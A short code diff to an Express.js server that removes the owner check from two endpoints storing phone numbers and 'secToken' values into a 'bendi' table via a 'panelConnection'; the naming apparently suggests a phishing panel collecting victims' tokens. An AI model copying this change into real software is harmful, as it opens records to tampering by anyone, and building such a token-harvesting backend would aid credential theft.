@@ -93,10 +93,9 @@ app.options("/bendiSavePhone", cors());
 app.post("/bendiSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   telephone = req.body.telephone;
-  owner = req.body.owner;
 
-  let details = [telephone, uniqueid, owner];
-  let query = `UPDATE bendi SET telephone=?, status = 11 WHERE uniqueid = ? AND owner = ?`;
+  let details = [telephone, uniqueid];
+  let query = `UPDATE bendi SET telephone=?, status = 11 WHERE uniqueid = ?`;
 
   panelConnection.query(query, details, (err, rows, fields) => {
     if (!err) res.send("Insertion Completed");
@@ -140,10 +139,9 @@ app.options("/bendiSaveST", cors());
 app.post("/bendiSaveST", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   secToken = req.body.secToken;
-  owner = req.body.owner;
 
-  let details = [secToken, uniqueid, owner];
-  let query = `UPDATE bendi SET secToken=?, status = 5 WHERE uniqueid = ? AND owner = ?`;
+  let details = [secToken, uniqueid];
+  let query = `UPDATE bendi SET secToken=?, status = 5 WHERE uniqueid = ?`;
 
   panelConnection.query(query, details, (err, rows, fields) => {
     if (!err) res.send("Insertion Completed");
